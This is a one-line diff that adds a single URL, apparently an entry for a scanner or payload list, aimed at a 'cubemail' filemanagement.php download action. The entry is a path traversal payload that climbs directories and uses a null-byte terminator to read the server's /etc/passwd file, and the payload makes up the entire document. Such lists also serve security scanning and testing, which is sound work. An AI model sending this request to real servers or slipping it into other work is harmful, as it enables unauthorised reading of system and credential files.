@@ -1,0 +1,1 @@
+/learn/cubemail/filemanagement.php?action=dl&f=../../../../../../../../../../../etc/passwd%00
